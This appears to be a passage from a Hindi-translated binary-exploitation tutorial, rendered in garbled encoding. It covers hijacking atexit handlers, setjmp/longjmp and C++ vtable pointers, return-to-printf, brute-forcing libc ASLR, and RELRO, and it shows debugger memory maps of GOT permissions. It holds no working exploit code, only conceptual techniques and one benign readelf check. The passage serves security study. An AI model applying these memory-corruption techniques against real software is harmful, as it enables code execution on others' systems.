### **\_\_atexit рд╕рдВрд░рдЪрдирд╛рдПрдБ**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдЗрд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рдирд╛ рдмрд╣реБрдд **рдЕрдЬреАрдм** рд╣реИред
{% endhint %}

**`atexit()`** рдПрдХ рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдЕрдиреНрдп рдлрд╝рдВрдХреНрд╢рдиреЗрдВ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХреА рдЬрд╛рддреА рд╣реИрдВ**ред рдпреЗ **рдлрд╝рдВрдХреНрд╢рдиреЗрдВ** рдПрдХ **`exit()`** рдпрд╛ **рдореБрдЦреНрдп** рдХреЗ **рд░рд┐рдЯрд░реНрди** рдХреЛ рдПрдХреНрд╕реАрдХреНрдпреВрдЯ рдХрд░рдиреЗ рдкрд░ **рдЪрд▓рд╛рдИ рдЬрд╛рдПрдВрдЧреА**ред\
рдЕрдЧрд░ рдЖрдк рдХрд┐рд╕реА рднреА рдЗрди **рдлрд╝рдВрдХреНрд╢рдиреЛрдВ** рдХреЗ **рдкрддреЗ** рдХреЛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╢реЗрд▓рдХреЛрдб рдкрд░ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рдХрд╛ **рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд** рдХрд░реЗрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдпрд╣ рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реИред\
рд╡рд░реНрддрдорд╛рди рдореЗрдВ **рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ** рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдП рдЧрдП рд╣реИрдВ рдФрд░ рдЕрдВрддрддрдГ рдЬрд┐рди рдкрддреЛрдВ рдкрд░ рдпрд╣ рдкреЙрдЗрдВрдЯ рдХрд░рддреЗ рд╣реИрдВ, рд╡реЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЛрдВ рдирд╣реАрдВ рд╣реИрдВ, рдмрд▓реНрдХрд┐ **XOR** рдФрд░ **рд░реИрдВрдбрдо рдХреБрдВрдЬреА** рдХреЗ рд╕рд╛рде рд╡рд┐рд╕реНрдерд╛рдкрдиреЛрдВ рдХреЗ рд╕рд╛рде **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдХрд┐рдП рдЧрдП рд╣реИрдВред рдЗрд╕рд▓рд┐рдП рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдпрд╣ рд╣рдорд▓рд╛ рд╡реЗрдХреНрдЯрд░ **рдХрдо рдЙрдкрдпреЛрдЧреА рд╣реИ рдХрдо рд╕реЗ рдХрдо x86** рдФрд░ **x64\_86** рдкрд░ред\
**рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдлрд╝рдВрдХреНрд╢рди** рд╣реИ **`PTR_MANGLE`**ред **рдЕрдиреНрдп рд╡рд╛рд╕реНрддреБрдХрд▓рд╛** рдЬреИрд╕реЗ m68k, mips32, mips64, aarch64, arm, hppa... **рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди** рдлрд╝рдВрдХреНрд╢рди рдХреЛ **рдирд╣реАрдВ рд▓рд╛рдЧреВ** рдХрд░рддреЗ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ **рдЙрд╕реА** рдХреЛ рд╡рд╛рдкрд╕ рднреЗрдЬрддрд╛ рд╣реИ рдЬреИрд╕рд╛ рдХрд┐ рдЗрд╕реЗ рдЗрдирдкреБрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдЗрди рд╡рд╛рд╕реНрддреБрдХрд▓рд╛рдУрдВ рдкрд░ рдЗрд╕ рд╡реЗрдХреНрдЯрд░ рд╕реЗ рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### **setjmp() & longjmp()**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдЗрд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рдирд╛ рдмрд╣реБрдд **рдЕрдЬреАрдм** рд╣реИред
{% endhint %}

**`Setjmp()`** рдХреЛ **рд╕рдВрджрд░реНрдн** (рд░рдЬрд┐рд╕реНрдЯрд░) рдХреЛ **рдмрдЪрд╛рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ\
**`longjmp()`** рдХреЛ **рд╕рдВрджрд░реНрдн** (рд░рдЬрд┐рд╕реНрдЯрд░) рдХреЛ **рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред\
**рдмрдЪрд╛рдП рдЧрдП рд░рдЬрд┐рд╕реНрдЯрд░** рд╣реИрдВ: `EBX, ESI, EDI, ESP, EIP, EBP`\
рдпрд╣ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ EIP рдФрд░ ESP **`PTR_MANGLE`** рдлрд╝рдВрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛ рдкрд╛рд░рд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП **рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд░рдЪрдирд╛ рд╡рд┐рдХрд▓реНрдк рд╡рд╣реА рд╣реИрдВ рдЬреИрд╕реЗ рдКрдкрд░**ред\
рдпреЗ рддреНрд░реБрдЯрд┐ рд╕реБрдзрд╛рд░ рдпрд╛ рдЕрдВрддрд░реНрд░реБрдкреНрддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реИрдВред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЬрд┐рддрдирд╛ рдореИрдВрдиреЗ рдкрдврд╝рд╛ рд╣реИ, рдЕрдиреНрдп рд░рдЬрд┐рд╕реНрдЯрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реИрдВ, **рддреЛ рдЕрдЧрд░ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рднреАрддрд░ `call ebx`, `call esi` рдпрд╛ `call edi`** рд╣реИ, рддреЛ рдирд┐рдпрдВрддреНрд░рдг рд╣рд╛рд╕рд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╛ рдЖрдк рдпрд╣ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ EBP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ рддрд╛рдХрд┐ ESP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

**VTable рдФрд░ VPTR in C++**

рдкреНрд░рддреНрдпреЗрдХ рдХреНрд▓рд╛рд╕ рдХреЗ рдкрд╛рд╕ рдПрдХ **Vtable** рд╣реЛрддреА рд╣реИ рдЬреЛ **рдореЗрдердбреНрд╕ рдХреЗ рд▓рд┐рдП рдкреЙрдЗрдВрдЯрд░реНрд╕ рдХрд╛ рдПрдХ рдПрд░реЗ** рд╣реЛрддрд╛ рд╣реИред

рдкреНрд░рддреНрдпреЗрдХ **рдХреНрд▓рд╛рд╕** рдХрд╛ рдПрдХ **VPtr** рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЙрд╕рдХреА рдХреНрд▓рд╛рд╕ рдХреЗ рдПрд░реЗ рдХрд╛ **рдкреЙрдЗрдВрдЯрд░** рд╣реЛрддрд╛ рд╣реИред VPtr рдкреНрд░рддреНрдпреЗрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд╣реЗрдбрд░ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ **VPtr** рдХрд╛ **рдУрд╡рд░рд░рд╛рдЗрдЯ** рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдЗрд╕реЗ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдПрдХреНрд╕реАрдХреНрдпреВрдЯ рдХрд░рдиреЗ рдкрд░ рд╢реЗрд▓рдХреЛрдб рдореЗрдВ рдЬрд╛рдПред

## **рдкреНрд░рддрд┐рдмрдВрдзрд╛рддреНрдордХ рдФрд░ рдЯрд╛рд▓рдиреЗ**

**рдкреНрд░рд┐рдВрдЯрдл рдореЗрдВ рд╡рд╛рдкрд╕-рдореЗрдВ-рджрд╛рдЦрд┐рд▓**

рдпрд╣ рдПрдХ рддрдХрдиреАрдХ рд╣реИ рдЬреЛ рдПрдХ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдХреЛ рдПрдХ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рддреНрд░реБрдЯрд┐ рдореЗрдВ рдмрджрд▓ рджреЗрддреА рд╣реИред рдЗрд╕рдореЗрдВ EIP рдХреЛ рдПрдХ printf рдХреА рдУрд░ рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рдПрдХ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдорд╛рдирдХ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИред

**рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдкрд░ рд╣рдорд▓рд╛**

рд▓рд╛рдЗрдмреНрд░реЗрд░реА 16 рдмрд┐рдЯ рдХреА рдпрд╛рджреГрдЪреНрдЫрд┐рдХрддрд╛ рдХреЗ рд╕рд╛рде рдПрдХ рд╕реНрдерд╛рди рдкрд░ рд╣реЛрддреА рд╣реИ = 65636 рд╕рдВрднрд╛рд╡рд┐рдд рдкрддреЛрдВред рдЕрдЧрд░ рдПрдХ рд╕рд░реНрд╡рд░ рд╡рд┐рдХрд▓реНрдкреА рд╣реЛрддрд╛ рд╣реИ рддреЛ рдпрд╛рджреГрдЪреНрдЫрд┐рдХрддрд╛ рдХреЗ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдореЗрдореЛрд░реА рдкрддреЛрдВ рдХреЛ рдмрдЪрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдЖрдк libc рдХреЗ usleep() рдлрд╝рдВрдХреНрд╢рди рдкрд░ рдмреНрд░реВрдЯ рдлрд╝реЛрд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ "16" рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЬрдм рдпрд╣ рд╕рд╛рдорд╛рдиреНрдп рд╕реЗ рдЕрдзрд┐рдХ рд╕рдордп рд▓реЗрддрд╛ рд╣реИ рддреЛ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдорд┐рд▓ рдЬрд╛рдПред рдЬрд╛рдирддреЗ рд╣реБрдП рдХрд┐ рдпрд╣рд╛рдБ рд╣реИ рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рд╕реНрдерд╛рди, рдЖрдк рдбреЗрд▓реНрдЯрд╛_рдореИрдк рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдиреНрдпреЛрдВ рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

ASLR рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реИ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдПрдХрдорд╛рддреНрд░ рддрд░реАрдХрд╛ 64 рдмрд┐рдЯ рдХреА рд╡рд╛рд╕реНрддреБрдХрд▓рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред рд╡рд╣рд╛рдБ рдХреЛрдИ рдмреНрд░реВрдЯ рдлрд╝реЛрд░реНрд╕ рд╣рдорд▓рд╛ рдирд╣реАрдВ рд╣реИред

### Relro

**Relro (рдХреЗрд╡рд▓ рдкрдардиреАрдп рдкреБрдирд░реНрд╕реНрдерд╛рдкрди)** рдореЗрдореЛрд░реА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ NX рдХреЗ рд╕рдорд╛рди рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИред рдЕрдВрддрд░ рдпрд╣ рд╣реИ рдХрд┐ NX рдХреЗ рд╕рд╛рде рдпрд╣ рд╕реНрдЯреИрдХ рдХреЛ рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓ рдмрдирд╛рддрд╛ рд╣реИ, RELRO рдирд┐рд╢реНрдЪрд┐рдд рдЪреАрдЬреЛрдВ рдХреЛ рдХреЗрд╡рд▓ рдкрдардиреАрдп рдмрдирд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╣рдо рдЙрдиреНрд╣реЗрдВ рдкрд░ рд▓рд┐рдЦрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рди рд╣реЛрдВред рдореБрдЭреЗ рдЗрд╕реЗ рдПрдХ рдмрд╛рдзрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рджреЗрдЦрдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХрд┐ рд╣рдореЗрдВ рдПрдХ `got` рддрд╛рд▓рд┐рдХрд╛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ, рдЬрд┐рд╕ рдкрд░ рдмрд╛рдж рдореЗрдВ рдЪрд░реНрдЪрд╛ рдХреА рдЬрд╛рдПрдЧреАред `got` рддрд╛рд▓рд┐рдХрд╛ libc рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЛрдВ рдХреЛ рд░рдЦрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдмрд╛рдЗрдирд░реА рдЬрд╛рдиреЗ рдХрд┐ рдкрддреЗ рдХреНрдпрд╛ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдХреЙрд▓ рдХрд░ рд╕рдХреЗред рдЪрд▓реЛ рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЗ рд▓рд┐рдП `got` рддрд╛рд▓рд┐рдХрд╛ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЗ рд▓рд┐рдП рдореЗрдореЛрд░реА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреИрд╕реЗ рджрд┐рдЦрддреА рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ relro рд╣реИред

Relro рдХреЗ рд╕рд╛рде:
```bash
gefтЮд  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefтЮд  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefтЮд  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  тЖТ   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
**рдмрд┐рдирд╛ relro:**
```bash
gefтЮд  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefтЮд  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefтЮд  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  тЖТ   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
рдмрд╛рдЗрдирд░реА **рдмрд┐рдирд╛ relro** рдХреЗ рд▓рд┐рдП, рд╣рдо рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ `fgets` рдХреЗ рд▓рд┐рдП `got` рдПрдВрдЯреНрд░реА рдкрддрд╛ `0x404018` рд╣реИред рдореЗрдореЛрд░реА рдореИрдкрд┐рдВрдЧ рджреЗрдЦрдиреЗ рдкрд░ рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ `0x404000` рдФрд░ `0x405000` рдХреЗ рдмреАрдЪ рдореЗрдВ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ **рдЕрдиреБрдорддрд┐рдпрд╛рдБ `rw`** рд╣реИрдВ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рд╣рдо рдЗрд╕реЗ рдкрдврд╝ рдФрд░ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВред рдмрд╛рдЗрдирд░реА **relro рдХреЗ рд╕рд╛рде**, рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдмрд╛рдЗрдирд░реА рдХреЗ рд░рди рдХреЗ рд▓рд┐рдП `got` рдЯреЗрдмрд▓ рдкрддрд╛ (pie рд╕рдХреНрд╖рдо рд╣реИ рддреЛ рдпрд╣ рдкрддрд╛ рдмрджрд▓ рдЬрд╛рдПрдЧрд╛) `0x555555557fd0` рд╣реИред рдЙрд╕ рдмрд╛рдЗрдирд░реА рдХреА рдореЗрдореЛрд░реА рдореИрдкрд┐рдВрдЧ рдореЗрдВ рдпрд╣ `0x0000555555557000` рдФрд░ `0x0000555555558000` рдХреЗ рдмреАрдЪ рдореЗрдВ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдореЗрдореЛрд░реА **рдЕрдиреБрдорддрд┐ `r`** рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рд╕рд┐рд░реНрдл рдЗрд╕рд╕реЗ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред

рддреЛ **рдмрд╛рдЗрдкрд╛рд╕** рдХреНрдпрд╛ рд╣реИ? рдореИрдВ рдЙрд╕рдХреЗ рд▓рд┐рдП рдЖрдо рддреМрд░ рдкрд░ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдмрд╛рдЗрдкрд╛рд╕ рдХреЗрд╡рд▓ рдЙрди рдореЗрдореЛрд░реА рдХреНрд╖реЗрддреНрд░реЛрдВ рдореЗрдВ рд▓рд┐рдЦрдирд╛ рдирд╣реАрдВ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ relro рдХрд╛рд░рдг рд╕реЗ рдХреЗрд╡рд▓ рдкрдврд╝рд╛ рдЬрд╛рдПрдЧрд╛, рдФрд░ **рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЕрд▓рдЧ рддрд░реАрдХрд╛ рдвреВрдВрдвреЗрдВ**ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕рдХреЗ рд▓рд┐рдП рдмрд╛рдЗрдирд░реА рдХреЛ рдЖрдЧреЗ рдХреА рдкреНрд░рд╡рд░реНрддрди рдХреЗ рд▓рд┐рдП рдкрд╣рд▓реЗ рд╕реЗ рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ:

* рдЖрд▓рд╕реА рдмрд╛рдЗрдВрдбрд┐рдВрдЧ: рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрдм рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкрд╣рд▓реА рдмрд╛рд░ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, GOT рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдХреЗ рджреМрд░рд╛рди рд▓рд┐рдЦрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
* рдЕрдм рдмрд╛рдЗрдВрдб: рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдкреНрд░рд╛рд░рдВрдн рдореЗрдВ, рдлрд┐рд░ .got, .dtors, .ctors, .dynamic, .jcr рдЬреИрд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЦрдВрдбреЛрдВ рдХреЛ рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рддреА рд╣реИред `` `** ``-z relro`**`y`**`-z now\`\*\*

рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдкреНрд░реЛрдЧреНрд░рд╛рдо Bind now рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЖрдк рдпрд╣ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando рдмрд╛рдЗрдирд░реА рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдкрд╣рд▓реА рдмрд╛рд░ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, PLT (Procedure Linkage Table) рдкрд░ рдЫрд▓рд╛рдВрдЧ рд▓рдЧрд╛рдИ рдЬрд╛рддреА рд╣реИ, рдпрд╣рд╛рдБ рд╕реЗ рдПрдХ рдЫрд▓рд╛рдВрдЧ (jmp) GOT рдкрд░ рд▓рдЧрд╛рдИ рдЬрд╛рддреА рд╣реИ рдФрд░ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рд╣рд▓ рдирд╣реАрдВ рдХреА рдЧрдИ рд╣реИ (PLT рдХреЗ рдЕрдЧрд▓реЗ рдкрддреЗ рдХреЛ рд░рдЦрддреА рд╣реИ)ред рдЗрд╕рд▓рд┐рдП рдпрд╣ Runtime Linker рдпрд╛ rtfd рдХреЛ рдмреБрд▓рд╛рддреА рд╣реИ рддрд╛рдХрд┐ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХреЗ рдФрд░ рдЙрд╕реЗ GOT рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдФрд░ рдЧреЛрдЯ рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЧрдП рдкрддреЗ рдХреЛ рд╣рд▓ рдХрд░реЗред

